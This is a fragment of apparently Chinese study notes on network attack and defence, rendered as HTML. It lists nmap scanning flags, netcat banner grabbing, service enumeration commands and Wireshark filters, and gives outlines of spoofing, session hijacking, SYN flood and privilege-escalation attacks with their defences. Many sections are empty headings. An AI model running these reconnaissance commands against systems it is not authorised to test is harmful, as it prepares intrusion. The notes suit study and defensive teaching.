+<td>inanchor:</td>
+<td>inanchor:Python教程 Java</td>
+<td>仅返回 “锚文本” 中包含 “Python教程” 和 “Java” 的网页（关键词顺序可灵活）。</td>
+</tr>
+<tr>
+<td></td>
+<td>allinanchor:</td>
+<td>allinanchor:Python教程 Java</td>
+<td>仅返回 “锚文本” 中同时包含 “Python教程” 和 “Java” 的网页（关键词需全部出现）。</td>
+</tr>
+<tr>
+<td>范围与来源限定</td>
+<td>site:</td>
+<td>site:github.com Python 项目</td>
+<td>仅在 “<a href="https://github.com">github.com</a>” 网站内搜索包含 “Python 项目” 的内容。</td>
+</tr>
+<tr>
+<td></td>
+<td>filetype:</td>
+<td>filetype:ppt 产品发布会方案</td>
+<td>仅返回 “PPT 格式” 的文件，内容与 “产品发布会方案” 相关。</td>
+</tr>
+<tr>
+<td></td>
+<td>$</td>
+<td>wireless headphones $50-$100</td>
+<td>搜索售价在 50-100 美元之间的 “无线耳机”（支持价格范围）。</td>
+</tr>
+<tr>
+<td></td>
+<td>...</td>
+<td>奥运会 2000...2020</td>
+<td>搜索 2000 年至 2020 年期间与 “奥运会” 相关的内容，实现时间 / 数字范围查询。</td>
+</tr>
+<tr>
+<td>特殊功能</td>
+<td>~</td>
+<td>~healthy diet</td>
+<td>搜索包含 “healthy diet”（健康饮食）及近似词（如 “nutritious meals”）的结果。</td>
+</tr>
+<tr>
+<td></td>
+<td>related:</td>
+<td>related:medium.com</td>
+<td>查找与 “<a href="https://medium.com">medium.com</a>” 网站内容、风格类似的其他网站。</td>
+</tr>
+<tr>
+<td></td>
+<td>link</td>
+<td>link::medium.com</td>
+<td>查找与 “<a href="https://medium.com">medium.com</a>” 存在链接的其他网站。</td>
+</tr>
+<tr>
+<td></td>
+<td>define:</td>
+<td>define:元宇宙</td>
+<td>直接返回 “元宇宙” 的定义解释，无需额外筛选定义类内容。</td>
+</tr>
+<tr>
+<td></td>
+<td>location:</td>
+<td>coffee shop location:Shanghai</td>
+<td>搜索 “上海” 地区的 “咖啡店”，精准定位地域相关结果。</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Shodan</li>
+</ul>
+<h4 id="dns-ip">DNS 与 IP 查询<a class="headerlink" href="#dns-ip" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 查询 DNS 注册信息</span>
+<span class="c1"># Linux</span>
+whois
+
+<span class="c1"># 查询映射 IP 地址</span>
+<span class="c1"># Linux</span>
+dig
+<span class="c1"># Windows</span>
+nslookup
+
+<span class="c1"># 跟踪路由路径</span>
+<span class="c1"># Linux</span>
+traceroute
+<span class="c1"># Windows</span>
+tracert
+
+<span class="c1"># 查看网络连接状态、路由表、接口统计等</span>
+<span class="c1"># Linux or Windows</span>
+netstat
+</code></pre></div>
+<h3 id="_4">网络扫描<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<h4 id="_5">主机扫描<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 默认全部</span>
+nmap<span class="w"> </span>-sn
+<span class="c1"># 或 -sP</span>
+
+<span class="c1"># ICMP Echo 主机扫描</span>
+nmap<span class="w"> </span>-PE
+
+<span class="c1"># TCP SYN 主机扫描</span>
+nmap<span class="w"> </span>-PS<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+
+<span class="c1"># TCP ACK 主机扫描</span>
+nmap<span class="w"> </span>-PA<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+
+<span class="c1"># UDP 主机扫描</span>
+nmap<span class="w"> </span>-PU<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+</code></pre></div>
+<ul>
+<li>防范：Snort 等 IDS</li>
+</ul>
+<h4 id="_6">端口扫描<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># TCP connect() 扫描</span>
+nmap<span class="w"> </span>-sT<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+
+<span class="c1"># TCP SYN 扫描</span>
+nmap<span class="w"> </span>-sS<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+
+<span class="c1"># FIN 端口扫描</span>
+nmap<span class="w"> </span>-sF<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+
+<span class="c1"># NULL 端口扫描</span>
+nmap<span class="w"> </span>-sN<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+
+<span class="c1"># ACK 端口扫描</span>
+nmap<span class="w"> </span>-sA<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+
+<span class="c1"># Xmas 端口扫描</span>
+nmap<span class="w"> </span>-sX<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+
+<span class="c1"># UDP 端口扫描</span>
+nmap<span class="w"> </span>-sU<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+</code></pre></div>
+<ul>
+<li>防范：主要预防；Snort 等 IDS 和 IPS</li>
+</ul>
+<h4 id="_7">系统类型探查<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 操作系统主动探测</span>
+nmap<span class="w"> </span>-O<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+
+<span class="c1"># 操作系统被动辨识：P0f. siphon</span>
+
+<span class="c1"># 网络服务主动探测</span>
+nmap<span class="w"> </span>-sV<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+
+<span class="c1"># 网络服务被动辨识：PADS</span>
+</code></pre></div>
+<h4 id="_8">漏洞扫描<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h4>
+<ul>
+<li>技术原理</li>
+<li>安全漏洞数据库：漏洞信息、漏洞扫描评估的脚本、CVSS</li>
+<li>扫描引擎模块：前文四种扫描与探测</li>
+<li>...</li>
+<li>Nessus 漏洞扫描器</li>
+<li>防范：主要是预防</li>
+</ul>
+<h3 id="_9">网络查点<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p>在实施远程渗透攻击之前，针对已知的弱点，对识别出来的服务进行更加充分更具针对性的探查，来寻找真正可以攻击的入口，以及攻击过程中可能需要的关键数据。</p>
+<h4 id="_10">网络服务旗标抓取<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>telnet
+
+<span class="c1"># netcat</span>
+nc<span class="w"> </span>-v<span class="w"> </span><span class="o">[</span>url<span class="o">]</span><span class="w"> </span><span class="o">[</span>port<span class="o">]</span>
+</code></pre></div>
+<h4 id="_11">通用网络服务查点<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h4>
+<h4 id="unix">类 UNIX 平台网络服务查点<a class="headerlink" href="#unix" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 查点 RPC</span>
+rpcinfo<span class="w"> </span>-p<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+nmap<span class="w"> </span>-sR<span class="w"> </span><span class="o">[</span>ip<span class="o">]</span>
+
+<span class="c1"># 查点 SNMP</span>
+snmpwalk
+<span class="c1"># 以及图形化界面工具 IP Browser</span>
+</code></pre></div>
+<h4 id="windows">Windows 平台网络服务查点<a class="headerlink" href="#windows" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 查点 NetBIOS</span>
+net<span class="w"> </span>view<span class="w"> </span>/domain
+</code></pre></div>
+<h4 id="_12">网络查点防范措施<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h4>
+<h2 id="_13">网络嗅探与协议分析<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
+<h3 id="_14">网络嗅探<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
+<h4 id="_15">网络嗅探的原理与实现<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
+<h4 id="_16">网络嗅探器软件<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h4>
+<h4 id="_17">网络嗅探的探测与防范<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h4>
+<h3 id="_18">网络协议分析<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<h4 id="_19">网络协议分析技术<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h4>
+<h4 id="wireshark">网络协议分析工具 Wireshark<a class="headerlink" href="#wireshark" title="Permanent link">&para;</a></h4>
+<ul>
+<li>捕获过滤器</li>
+</ul>
+<p>基于 <strong>BPF（Berkeley Packet Filter）语法</strong>，简洁且面向底层协议，核心格式为“协议 条件 值”，支持逻辑运算符（<code>and</code>/<code>or</code>/<code>not</code>，可简写为 <code>&amp;&amp;</code>/<code>||</code>/<code>!</code>）。  </p>
+<p>#### 常用示例：</p>
+<table>
+<thead>
+<tr>
+<th>过滤条件</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>host 192.168.1.1</code></td>
+<td>只捕获与IP为<a href="192.168.1.1">192.168.1.1</a>相关的数据包</td>
+</tr>
+<tr>
+<td><code>port 80</code></td>
+<td>只捕获端口为80（HTTP）的数据包</td>
+</tr>
+<tr>
+<td><code>tcp port 443</code></td>
+<td>只捕获TCP协议且端口为443（HTTPS）的包</td>
+</tr>
+<tr>
+<td><code>udp and host 10.0.0.2</code></td>
+<td>只捕获UDP协议且与<a href="10.0.0.2">10.0.0.2</a>相关的包</td>
+</tr>
+<tr>
+<td><code>not arp</code></td>
+<td>排除ARP协议的数据包</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>显示过滤器</li>
+</ul>
+<p>基于 Wireshark 自定义语法，更复杂且面向解析后的协议字段，核心格式为“协议.字段 == 值”，支持丰富的比较运算符（<code>==</code>/<code>!=</code>/<code>&gt;=</code>/<code>contains</code>等）和逻辑运算符（<code>and</code>/<code>or</code>/<code>not</code>）。  </p>
+<p>#### 常用示例：</p>
+<table>
+<thead>
+<tr>
+<th>过滤条件</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ip.addr == 192.168.1.1</code></td>
+<td>显示源IP或目的IP为<a href="192.168.1.1">192.168.1.1</a>的包</td>
+</tr>
+<tr>
+<td><code>tcp.port == 80</code></td>
+<td>显示源端口或目的端口为80的TCP包</td>
+</tr>
+<tr>
+<td><code>http.request.method == "GET"</code></td>
+<td>显示HTTP请求方法为GET的包</td>
+</tr>
+<tr>
+<td><code>dns.qry.name contains "google"</code></td>
+<td>显示DNS查询中包含“google”的包</td>
+</tr>
+<tr>
+<td><code>not icmp</code></td>
+<td>排除ICMP协议（如ping包）</td>
+</tr>
+</tbody>
+</table>
+<h2 id="tcpip">TCP/IP 网络协议栈攻击<a class="headerlink" href="#tcpip" title="Permanent link">&para;</a></h2>
+<h3 id="_20">概述<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h3>
+<h4 id="_21">网络安全属性和与攻击模式<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>基本攻击模式</th>
+<th>攻击类型</th>
+<th>所破坏的网络安全属性</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>截获（嗅探、监听）</td>
+<td>被动攻击</td>
+<td>机密性</td>
+</tr>
+<tr>
+<td>篡改</td>
+<td>主动攻击</td>
+<td>完整性</td>
+</tr>
+<tr>
+<td>中断（DoS）</td>
+<td>主动攻击</td>
+<td>可用性</td>
+</tr>
+<tr>
+<td>伪造</td>
+<td>主动攻击</td>
+<td>真实性</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>不可抵赖性</td>
+</tr>
+</tbody>
+</table>
+<h4 id="tcpip_1">TCP/IP 网络协议栈安全缺陷与攻击技术<a class="headerlink" href="#tcpip_1" title="Permanent link">&para;</a></h4>
+<ul>
+<li>网络接口层</li>
+<li>互联层</li>
+<li>传输层</li>
+<li>应用层</li>
+</ul>
+<h4 id="_22">原始报文伪造技术及工具<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h4>
+<h3 id="_23">网络层协议攻击<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h3>
+<h4 id="ip">IP 源地址欺骗<a class="headerlink" href="#ip" title="Permanent link">&para;</a></h4>
+<ul>
+<li>IP 源地址欺骗原理</li>
+<li>IP 源地址欺骗技术的应用场景</li>
+<li>利用 Netwox 进行 IP 源地址欺骗</li>
+<li>IP 源地址欺骗的防范措施</li>
+</ul>
+<h4 id="arp">ARP 欺骗<a class="headerlink" href="#arp" title="Permanent link">&para;</a></h4>
+<ul>
+<li>ARP 协议工作原理</li>
+<li>ARP 欺骗攻击技术原理</li>
+<li>ARP 欺骗技术的应用场景</li>
+<li>利用 Netwox 进行 ARP 欺骗</li>
+<li>ARP 欺骗攻击技术防范措施</li>
+</ul>
+<h4 id="icmp">ICMP 路由重定向攻击<a class="headerlink" href="#icmp" title="Permanent link">&para;</a></h4>
+<ul>
+<li>ICMP 路由重定向机制原理</li>
+<li>ICMP 路由重定向攻击技术</li>
+<li>利用 Netwox 进行 ICMP 路由重定向攻击</li>
+<li>ICMP 路由重定向攻击防范</li>
+</ul>
+<h3 id="_24">传输层协议攻击<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h3>
+<h4 id="tcp-rst">TCP RST 攻击<a class="headerlink" href="#tcp-rst" title="Permanent link">&para;</a></h4>
+<h4 id="tcp">TCP 会话劫持攻击<a class="headerlink" href="#tcp" title="Permanent link">&para;</a></h4>
+<ul>
+<li>TCP 会话劫持攻击原理</li>
+<li>TCP 会话劫持攻击技术过程</li>
+<li>TCP 会话劫持攻击防范措施</li>
+</ul>
+<h4 id="tcp-syn-flood">TCP SYN Flood 拒绝服务攻击<a class="headerlink" href="#tcp-syn-flood" title="Permanent link">&para;</a></h4>
+<ul>
+<li>SYN Flood 攻击原理</li>
+<li>利用 Netwox 进行 TCP SYN Flood 攻击</li>
+<li>SYN Flood 攻击防范措施</li>
+<li>SYN-Cookie 技术</li>
+<li>防火墙地址状态监控技术</li>
+</ul>
+<h4 id="udp-flood">UDP Flood 拒绝服务攻击<a class="headerlink" href="#udp-flood" title="Permanent link">&para;</a></h4>
+<h3 id="tcpip_2">TCP/IP 网络协议栈攻击防范措施<a class="headerlink" href="#tcpip_2" title="Permanent link">&para;</a></h3>
+<ul>
+<li>监测、预防与安全加固</li>
+<li>网络安全协议</li>
+<li>网络接口层的安全协议</li>
+<li>网络互联层的安全协议</li>
+<li>传输层的安全协议</li>
+<li>应用层的安全协议</li>
+<li>下一代互联网协议</li>
+</ul>
+<h2 id="_25">网络安全防范技术<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h2>
+<h3 id="_26">安全模型<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h3>
+<h3 id="_27">网络安全防范技术和与系统<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h3>
+<h4 id="_28">防火墙技术概述<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p>防火墙的功能</p>
+</li>
+<li>
+<p>检查控制进出网络的网络流量</p>
+</li>
+<li>防止脆弱或不安全的协议和服务</li>
+<li>防止内部网络信息的外泄</li>
+<li>对网络存取和访问进行监控审计</li>
+<li>
+<p>防火墙可以强化网络安全策略并集成其他安全防御机制</p>
+</li>
+<li>
+<p>防火墙的不足</p>
+</li>
+</ul>
+<p>网络边界访问控制机制的先天不足：</p>
+<ul>
+<li>来自网络内部的安全威胁</li>
+<li>通过非法外联的网络攻击</li>
+<li>计算机病毒传播</li>
+</ul>
+<p>技术瓶颈：</p>
+<ul>
+<li>针对开放服务安全漏洞的渗透攻击</li>
+<li>针对网络客户端程序的渗透攻击</li>
+<li>基于隐蔽通道进行通信的特洛伊木马或僵尸网络</li>
+</ul>
+<h4 id="_29">防火墙技术和产品<a class="headerlink" href="#_29" title="Permanent link">&para;</a></h4>
+<ul>
+<li>包过滤技术</li>
+<li>基于状态检测的包过滤技术</li>
+<li>代理技术</li>
+<li>应用层代理技术</li>
+<li>电路级代理技术</li>
+<li>NAT 代理技术</li>
+<li>防火墙产品</li>
+<li>防火墙部署方法</li>
+<li>其他网络防御技术</li>
+<li>VPN</li>
+<li>//</li>
+</ul>
+<h3 id="_30">网络检测技术与系统<a class="headerlink" href="#_30" title="Permanent link">&para;</a></h3>
+<h4 id="_31">入侵检测技术概述<a class="headerlink" href="#_31" title="Permanent link">&para;</a></h4>
+<h4 id="snort">入侵检测系统：Snort<a class="headerlink" href="#snort" title="Permanent link">&para;</a></h4>
+<h3 id="_32">网络安全事件响应技术<a class="headerlink" href="#_32" title="Permanent link">&para;</a></h3>
+<h1 id="_33">系统安全攻防技术<a class="headerlink" href="#_33" title="Permanent link">&para;</a></h1>
+<h2 id="windows_1">Windows 操作系统安全攻防<a class="headerlink" href="#windows_1" title="Permanent link">&para;</a></h2>
+<h3 id="windows_2">Windows 操作系统的基本结构<a class="headerlink" href="#windows_2" title="Permanent link">&para;</a></h3>
+<h3 id="windows_3">Windows 操作系统的安全体系结构与机制<a class="headerlink" href="#windows_3" title="Permanent link">&para;</a></h3>
+<h4 id="windows_4">Windows 安全体系结构<a class="headerlink" href="#windows_4" title="Permanent link">&para;</a></h4>
+<h4 id="windows_5">Windows 身份认证机制<a class="headerlink" href="#windows_5" title="Permanent link">&para;</a></h4>
+<ul>
+<li>安全主体：用户、用户组、计算机</li>
+<li>SID：形如<code>S-1-5-21-3170186647-2604921064-2923912053-1003</code>，1 为版本号，第三位是 48bit 数值，表示标识符颁发机构（5 代表 the Windows Security authority），之后为多个 32bit 数值的子颁发机构表示，最后一部分是 RID，一般 Administrator 账户的 RID 均为 500。</li>
+<li>为每个用户和计算机设置账户：</li>
+<li>拥有最高权限的本地 Administrator 账户</li>
+<li>作为自动运行系统进程环境的 SYSTEM/LocalSystem 账户</li>
+<li>IUSR_Machinename IIS 服务的匿名网络访问账户等</li>
+<li>用户组</li>
+<li>本地最高权限用户组 Administrators</li>
+</ul>
+<h4 id="windows_6">Windows 授权与访问控制机制<a class="headerlink" href="#windows_6" title="Permanent link">&para;</a></h4>
+<h4 id="windows_7">Windows 安全审计机制<a class="headerlink" href="#windows_7" title="Permanent link">&para;</a></h4>
+<h4 id="windows_8">Windows 的其他安全机制<a class="headerlink" href="#windows_8" title="Permanent link">&para;</a></h4>
+<ul>
+<li>安全中心：防火墙、补丁自动更新、病毒防护</li>
+<li>网络访问控制（NAC）</li>
+<li>IPSec 加密与验证机制</li>
+<li>EFS 文件加密系统</li>
+<li>BitLocker 磁盘加密</li>
+<li>Windows 资源保护（WRP）</li>
+<li>Secure Boot</li>
+</ul>
+<h3 id="windows_9">Windows 操作系统远程安全攻防技术<a class="headerlink" href="#windows_9" title="Permanent link">&para;</a></h3>
+<h4 id="windows_10">Windows 系统的安全漏洞与生命周期<a class="headerlink" href="#windows_10" title="Permanent link">&para;</a></h4>
+<h4 id="windows_11">Windows 远程口令猜测与破解攻击<a class="headerlink" href="#windows_11" title="Permanent link">&para;</a></h4>
+<h4 id="windows_12">Windows 网络服务全称渗透攻击<a class="headerlink" href="#windows_12" title="Permanent link">&para;</a></h4>
+<h4 id="metasploit-windows-attack">Metasploit Windows Attack<a class="headerlink" href="#metasploit-windows-attack" title="Permanent link">&para;</a></h4>
+<h3 id="windows_13">Windows 操作系统远程安全攻防技术<a class="headerlink" href="#windows_13" title="Permanent link">&para;</a></h3>
+<h4 id="windows_14">Windows 本地特权提升<a class="headerlink" href="#windows_14" title="Permanent link">&para;</a></h4>
+<h4 id="windows_15">Windows 敏感信息窃取<a class="headerlink" href="#windows_15" title="Permanent link">&para;</a></h4>
+<h4 id="windows_16">Windows 消踪灭迹<a class="headerlink" href="#windows_16" title="Permanent link">&para;</a></h4>
+<h4 id="windows_17">Windows 远程控制与后门程序<a class="headerlink" href="#windows_17" title="Permanent link">&para;</a></h4>
+<h2 id="linux">Linux 操作系统安全攻防<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h2>
+<h3 id="linux_1">Linux 操作系统的结构<a class="headerlink" href="#linux_1" title="Permanent link">&para;</a></h3>
+<h4 id="linux_2">Linux 的进程与线程管理机制<a class="headerlink" href="#linux_2" title="Permanent link">&para;</a></h4>
+<p>抢占式多用户多进程。进程作为最基本的调度单元，维护一个 PCB 结构，由内核 schedule 进程调度函数来一句进程优先级和 CPU 等资源情况来选择进程进行执行。</p>
+<h4 id="linux_3">Linux 的内存管理机制<a class="headerlink" href="#linux_3" title="Permanent link">&para;</a></h4>
+<h4 id="linux_4">Linux 的文件系统管理机制<a class="headerlink" href="#linux_4" title="Permanent link">&para;</a></h4>
+<h4 id="linux_5">Linux 的设备控制机制<a class="headerlink" href="#linux_5" title="Permanent link">&para;</a></h4>
+<h4 id="linux_6">Linux 的网络机制<a class="headerlink" href="#linux_6" title="Permanent link">&para;</a></h4>
+<h4 id="linux_7">Linux 的系统调用机制<a class="headerlink" href="#linux_7" title="Permanent link">&para;</a></h4>
+<h3 id="linux_8">Linux 操作系统的安全机制<a class="headerlink" href="#linux_8" title="Permanent link">&para;</a></h3>
+<h4 id="linux_9">Linux 身份认证机制<a class="headerlink" href="#linux_9" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p>Linux 用户</p>
+</li>
+<li>
+<p>角色类型</p>
+<ul>
+<li>Root 根用户</li>
+<li>普通用户</li>
+<li>系统用户：不能登录系统，但却是系统运行不可缺少的用户，如用于启动网络服务的 daemon、apache，以及匿名访问的 nobody、ftp等。</li>
+</ul>
+</li>
+<li>
+<p>用户信息：保存在<code>/etc/passwd</code>，包括用户名、每个用户唯一的 uid、使用 Shell 类型、用户初始目录等</p>
+</li>
+<li>
+<p>加密口令字：保存在 <code>/etc/shadow</code>，只对 Root 可读</p>
+</li>
+<li>
+<p>Linux 用户组</p>
+</li>
+<li>
+<p>用户组信息：保存在<code>/etc/group</code>，包括用户组名称、用户组 gid、用户组包含的用户名列表</p>
+</li>
+<li>加密口令字：保存在<code>/etc/gshadow</code></li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1"># 查询和显示当前用户所属组</span>
+id<span class="w"> </span>-a
+
+<span class="c1"># 添加用户组</span>
+groupadd
+
+<span class="c1"># 向特定组添加用户</span>
+usermod<span class="w"> </span>-G<span class="w"> </span><span class="o">[</span>group_name<span class="o">]</span><span class="w"> </span><span class="o">[</span>user_name<span class="o">]</span>
+</code></pre></div>
+<ul>
+<li>
+<p>Linux 的本地登录用户认证机制</p>
+</li>
+<li>
+<p>init 进程启动 getty 产生若干虚拟控制台（如 tty1，tty2等）。在控制台显示登陆，当用户敲入用户时，getty 执行 login 进程，认证成功后 login 进程会 fork 相应用户 Shell 的子进程。用户可以在对应的 Shell 下开始工作。</p>
+</li>
+<li>
+<p>登录 login 进程通过 <code>Crypt()</code> 函数对口令验证。 <code>Crypt()</code> 函数用户设置密码时，会随机产生一个 salt，与用户的密码一起加密，得到加密口令字，并和 salt 一起保存在 shadow 文件中。</p>
+</li>
+<li>
+<p>Linux 的远程登录用户认证机制</p>
+</li>
+<li>
+<p>SSH</p>
+<ul>
+<li>基于口令的身份认证</li>
+<li>基于非对称密钥的身份认证：用户为自己创建一对非对称密钥，并把公钥放置到需要访问的服务器上。在连接 SSH 服务器时，客户端软件会对服务器发送请求，请求使用证书方式进行身份认证。服务器收到请求后，使用请求用户的公钥加密“质询”并把它发送给客户端软件。客户端软件收到“质询”后就可以使用私人密钥进行解密，再发送给服务器端，完成认证。</li>
+</ul>
+</li>
+<li>Apache//</li>
+<li>
+<p>Samba//</p>
+</li>
+<li>
+<p>Linux 的统一身份认证中间件——PAM</p>
+</li>
+</ul>
+<p>PAM（Pluggable Authentication Modules：可插入身份认证模块）//</p>
+<h4 id="linux_10">Linux 授权与访问控制机制<a class="headerlink" href="#linux_10" title="Permanent link">&para;</a></h4>
+<ul>
+<li>文件的所有者：以所有者的 uid 和文件所有者所在组的 gid 指明。</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1"># 修改所有者</span>
+chown<span class="w"> </span><span class="o">[</span>选项<span class="o">]</span><span class="w"> </span>新所有者<span class="o">[</span>:新所属组<span class="o">]</span><span class="w"> </span>目标文件/目录
+</code></pre></div>
+<ul>
+<li>文件的访问权限</li>
+</ul>
+<p>10个标志位：</p>
+<ul>
+<li>1：文件类型。“-”普通文件，“d”目录，“l”符号链接，“b”块设备文件，“c”字符设备（串行端口设备）</li>
+<li>
+<p>2~10：每3个一组分为3组，分别表示文件所有者、所属组用户以及其他用户对该文件的读（R）、写（W）、执行（X）权限</p>
+</li>
+<li>
+<p>文件的特殊执行权限</p>
+</li>
+</ul>
+<p>数字表示法：特殊权限对应额外的数字位（放在基础权限数字前）</p>
+<ul>
+<li>
+<p>SUID：仅对可执行文件有效。当一个可执行文件设置了 SUID 权限时，用户执行该文件时，会临时获得文件所有者的权限（而非执行用户自身的权限）。</p>
+<div class="highlight"><pre><span></span><code>chmod<span class="w"> </span>u+s<span class="w"> </span>文件名<span class="w">   </span><span class="c1"># 设置 SUID</span>
+chmod<span class="w"> </span>u-s<span class="w"> </span>文件名<span class="w">   </span><span class="c1"># 取消 SUID</span>
+</code></pre></div>
+</li>
+<li>
+<p>SGID：</p>
+<ul>
+<li>对可执行文件：执行文件时，临时获得文件所属组的权限。</li>
+<li>对目录：在该目录下新建的文件 / 子目录，其所属组会继承目录的所属组（而非创建者的主组）。</li>
+</ul>
+<div class="highlight"><pre><span></span><code>chmod<span class="w"> </span>g+s<span class="w"> </span>文件名/目录名<span class="w">   </span><span class="c1"># 设置 SGID</span>
+chmod<span class="w"> </span>g-s<span class="w"> </span>文件名/目录名<span class="w">   </span><span class="c1"># 取消 SGID</span>
+</code></pre></div>
+</li>
+<li>
+<p>Sticky Bit：仅对目录有效，用于限制目录中文件的删除权限 —— 即使用户对目录有写权限，也只能删除自己创建的文件，无法删除其他用户的文件。</p>
+<div class="highlight"><pre><span></span><code>chmod<span class="w"> </span>+t<span class="w"> </span>目录名<span class="w">   </span><span class="c1"># 设置粘滞位</span>
+chmod<span class="w"> </span>-t<span class="w"> </span>目录名<span class="w">   </span><span class="c1"># 取消粘滞位</span>
+</code></pre></div>
+</li>
+<li>
+<p>Linux 访问控制机制的不足及改进</p>
+</li>
+</ul>
+<p>//</p>
+<h4 id="linux_11">Linux 安全审计机制<a class="headerlink" href="#linux_11" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p>连接事件日志：由多个程序执行，把记录写入到 <code>/var/log/wtmp</code>和<code>var/log/utmp</code>，login 等用户登录程序复制更新 wtmp 和 utmp 文件，使系统管理员能够跟踪谁在何时登录到系统</p>
+</li>
+<li>
+<p>进程统计日志：由系统内核执行，当一个进程结束时，为每个进程往进程统计文件（paact 或 acct）中写一个记录。</p>
+</li>
+<li>
+<p>错误日志记录：由通用的日志记录服务 syslogd（8）执行，各种系统守护进程、用户程序和内核通过 syslog 向文件 <code>var/log/messages</code>报告值得注意的事件。</p>
+</li>
+</ul>
+<p>//</p>
+<h3 id="linux_12">Linux 操作系统远程安全攻防技术<a class="headerlink" href="#linux_12" title="Permanent link">&para;</a></h3>
+<h4 id="linux_13">Linux 远程口令字猜解攻击<a class="headerlink" href="#linux_13" title="Permanent link">&para;</a></h4>
+<h4 id="linux_14">Linux 网络服务远程渗透攻击<a class="headerlink" href="#linux_14" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Linux 系统安全漏洞、渗透攻击与补丁更新过程</li>
+<li>针对 Linux 系统网络服务的远程渗透攻击</li>
+<li>Linux 内核中的网络协议栈实现</li>
+<li>LAMP Web 网站构建解决方案中的网络服务</li>
+<li>FTP、Samba 等文件共享服务</li>
+<li>电子邮件收发服务</li>
+<li>其他网络服务</li>
+<li>针对 Linux 系统网络服务的远程渗透攻击的安全防范措施</li>
+</ul>
+<h4 id="linux_15">攻击 Linux 客户端程序和用户<a class="headerlink" href="#linux_15" title="Permanent link">&para;</a></h4>
+<ul>
+<li>攻击 Linux 平台上的客户端程序</li>
+<li>攻击 Linux 系统用户</li>
+<li>针对客户端与用户攻击的安全防范措施</li>
+</ul>
+<h4 id="linux_16">攻击 Linux 路由器和监听器<a class="headerlink" href="#linux_16" title="Permanent link">&para;</a></h4>
+<ul>
+<li>攻击 Linux 路由器与防火墙</li>
+<li>攻击监听器和入侵检测器</li>
+<li>针对路由器与见同期攻击的安全防范措施</li>
+</ul>
+<h4 id="metasploit-linux-attack">Metasploit Linux Attack<a class="headerlink" href="#metasploit-linux-attack" title="Permanent link">&para;</a></h4>
+<p>//</p>
+<h3 id="linux_17">Linux 操作系统远程安全攻防技术<a class="headerlink" href="#linux_17" title="Permanent link">&para;</a></h3>
+<h4 id="linux_18">Linux 本地特权提升<a class="headerlink" href="#linux_18" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Linux 用户口令字破解</li>
+<li>利用 sudo 的缺陷进行特权提升</li>
+<li>利用用户态 SUID 程序漏洞进行特权提升</li>
+<li>针对 SUID 程序的本地缓冲区溢出攻击</li>
+<li>针对 SUID 程序的符号链接攻击</li>
+<li>针对 SUID 程序的竞争条件攻击</li>
+<li>针对 SUID 程序的共享函数库攻击</li>
+<li>利用内核空间代码漏洞进行特权提升</li>
+<li>利用系统配置不当实施本地特权提升</li>
+<li>针对 Linux 本地特权提升攻击的防范技术与措施</li>
+</ul>
+<h4 id="linux_19">Linux 消踪灭迹<a class="headerlink" href="#linux_19" title="Permanent link">&para;</a></h4>
+<h4 id="linux_20">Linux 远程控制与后门程序<a class="headerlink" href="#linux_20" title="Permanent link">&para;</a></h4>
+<h2 id="_34">恶意代码安全攻防<a class="headerlink" href="#_34" title="Permanent link">&para;</a></h2>
+<h3 id="_35">恶意代码基础知识<a class="headerlink" href="#_35" title="Permanent link">&para;</a></h3>
